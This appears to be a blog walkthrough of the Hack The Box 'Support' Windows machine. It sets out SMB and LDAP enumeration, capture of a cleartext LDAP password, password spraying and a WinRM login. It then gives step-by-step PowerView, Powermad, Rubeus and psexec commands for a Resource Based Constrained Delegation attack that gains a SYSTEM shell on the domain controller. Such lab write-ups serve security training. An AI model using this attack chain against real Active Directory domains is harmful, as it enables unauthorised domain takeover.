---
title: "Support Walkthrough(Hack The Box)"
date: 2025-03-18
draft: false
description: "Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication....."
tags: ["Easy", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
 
---
## About
- Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine&amp;amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called `support` is identified in the users list, and the `info` field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through `SharpHound`, and `BloodHound` reveals that the `Shared Support Accounts` group that the `support` user is a member of, has `GenericAll` privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as `NT Authority\System` is received. 

## Reconnaissance & Enumeration
- The port scan reveals multiple open ports 
![Pasted image 20241221142512.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221142512.png?raw=true)
- As always we got LDAP, Netbios, SMB etc ports open
- Using `smbclient` I enumerated for smb shares and we got the share list  
```bash
smbclient -L support.htb
```
![Pasted image 20241221143207.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221143207.png?raw=true)
- However the interesting share here is `support-tools`. 
- Using netexec I confirmed the guest login and it was a success
```bash
netexec smb support.htb -u sundeity -p ""
```
- I enumerated for guest shares and we got access to two shares
```bash
netexec smb support.htb -u sundeity -p "" --shares
```
![Pasted image 20241221143552.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221143552.png?raw=true)
- So I checked the share `support-tools` and as the name suggests we got some tools inside the directory. Most of the tools are familiar to me aleast their names are familiar
![Pasted image 20241221143832.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221143832.png?raw=true)
- I decided to enumerate all the zips from the share. Initially the zips didn't provide me with anything interesting so I moved on to enumerate LDAP. 
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 support.htb
```
![Pasted image 20241221145020.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221145020.png?raw=true)
- Then I enumerated for users using netexec from smb and got the users list
- Removed all unwanted texts from the list
```bash
cat users.txt | grep "SidTypeUser" | cut -d '\' -f 2 | cut -d '(' -f 1 >> users-smb.txt
```
![Pasted image 20241221145402.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221145402.png?raw=true)
- I Stored the users in a file.
### UsersInfo.exe analysis

- Remember the file `UsersInfo.exe.zip` that we have downloaded from SMB share. At first I didn't notice it but after a while I was stuck and then I only I realized the unfamiliar tool among the known tools within the share  
- On running `UsersInfo.exe` with wine I can see it, authenticate to ldap for retrieving the user that we requested by that this tool checks if that particular user available in the DC or not, then it returns the statement accordingly.
- For an example the tool returned me a error `No such object` meaning the requested user cannot be found within LDAP  
![Pasted image 20241221210746.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221210746.png?raw=true)
- This tool doesn't use any encryption to login against LDAP thus leaves the password used for authentication in clear text .If I can capture the traffic in wireshark I can get the password.
![Pasted image 20241221210900.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221210900.png?raw=true)
- In the LDAP I can see it authenticate as user `ldap` with the password. As I got a username and password I can now collect data for bloodhound
- Getting data for Bloodhound
![Pasted image 20241221211206.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221211206.png?raw=true)

## Exploitation

- If we search the results of ldapsearch , particularly in the info field I can get another password. Which is new to me cause I never seen anything sensitive in an info field.
![new](https://media1.tenor.com/m/YtbP6LkOtbsAAAAd/everything-was-very-new-to-me-jiya-shankar.gif)

```bash
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w '<password' -b "DC=support,DC=htb" | grep "info"
```
![Pasted image 20241221212252.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221212252.png?raw=true)
- In LDAP I got this password from the user `support@support.htb`
- I checked the bloodhound data, and user `support` is member of three groups
![Pasted image 20241221213052.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221213052.png?raw=true)
- For a change I used `crackmapexec` to password spray, eventually it confirms the password for `support` user
```bash
crackmapexec winrm support.htb -u users-smb.txt -p <password>
```
![Pasted image 20241221213417.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221213417.png?raw=true)
- Using the newly dicovered password I logged into winrm via `evilwinrm` as user `support`
```bash
evil-winrm -u support -p '<password>' -i support.htb 
```
- Got the {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20241221213908.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221213908.png?raw=true)

## Privilege Escalation
- If we see, user `support` is in a group called `Shared Support Accounts@Support.htb` . That group have Generic all permissions over Domain controller Itself.
![Pasted image 20241222182550.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222182550.png?raw=true)
- This privilege allows the trustee to manipulate the target object however they wish.
### Abusing GenericALL
- We can abuse this by the help instructions in Bloodhound for this Privilege. Here I am going to create a Fake computer under my control and that will act as DC to get kerberos ticket. Follow the steps below carefully
![care](https://media1.tenor.com/m/ZB5i28vlmuMAAAAd/id-be-careful-if-i-were-you-rupaul.gif)
- **Required Tools**
	- [PowersView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1)
	- [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1)
	- Rubeus.exe(Pre build from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64))
#### Step 1: Upload all the tools to the target system, then
- Do the following in the winrm shell	
> `cd C:\\programdata`

> `upload  PowersView.ps1`

> `upload Powermad.ps1`

> `upload Rubeus.exe`
	 
![Pasted image 20241222185340.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185340.png?raw=true)
#### Step 2: Invoking all the scripts
```powershell
. .\PowerView.ps1
```

```powershell
. .\Powermad.ps1
```
#### Step 3: Creating a Fake Computer
```powershell
New-MachineAccount -MachineAccount <Computername> -Password $(ConvertTo-SecureString '<Password>' -AsPlainText -Force)
```
- We need SID of the computer that we have created earlier, so that we can assign that value to a variable
```powershell
$fakesid = Get-DomainComputer <Computername> | select -expand objectsid
```
#### Step 4: Configuring
- Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC

{{< badge >}} Definition {{< /badge >}}

{{< details summary="What is ACL?" >}} An ACL is a list of access control entries (ACEs) that define permissions for users or groups to access specific objects (like users, groups, computers, or organizational units) and their attributes. 
Purpose:
ACLs ensure that only authorized users can access specific resources and perform specific actions, enhancing security and data protection. 
{{< /details >}}
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```powershell
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```powershell
$SD.GetBinaryForm($SDBytes, 0)
```

```powershell
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
![Pasted image 20241222185607.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185607.png?raw=true)
#### Step 5: Auth as the Computer

```powershell
.\Rubeus.exe hash /password:<Password> /user:<ComputerName> /domain:support.htb
```
- Now copy the `rc4_hmac` hash from the output
![Pasted image 20241222185715.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185715.png?raw=true)

#### Step 6: Get the Kerberos Ticket

```powershell
.\Rubeus.exe s4u /user:<Computername>$ /rc4:<Hash> /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```
- Now ticket will be captured. We can see the base64 encoded ticket
![Pasted image 20241222185806.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185806.png?raw=true)
- Copy the ticket for Administrator and put in a file called `ticket.kirbi.b64`
- Remove all the whitespaces and unwanted lines, I done this in vim using this command `:%s/\s\+//g`
- Now decode the base64 into a different file

```bash
base64 -d tick.kirbi.b64 > ticket.kirbi
```
- For linux operating systems we have to convert the ticket from `kirbi` to `ccache`, for passing the ticket
- We can easily convert this using  `ticketConverter.py`. It's one of the tool from Impacket tool kit.
```bash
sudo /home/n_emperor/.local/share/pipx/venvs/netexec/bin/ticketConverter.py ticket.kirbi ticket.ccache
```
![Pasted image 20241222190321.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222190321.png?raw=true)
- Now **Pass the ticket and spawn a shell**
```bash
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
![Pasted image 20241222190446.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222190446.png?raw=true)
## End
- Secured the {{< keyword >}} Root flag  {{< /keyword >}} 
![Pasted image 20241222190524.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222190524.png?raw=true)

{{< typeit >}} Knock..knock... this walkthrough is over, don't forget to check out my other walkthroughs. Bye, see you again  {{< /typeit >}}


![end](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjBjdzF0N2Nid25rOTViZWZmcWtmMDZpazQ0b21tbTJxeDY3Z2YwNiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/QLpMNfBtUi3ss/giphy.gif)
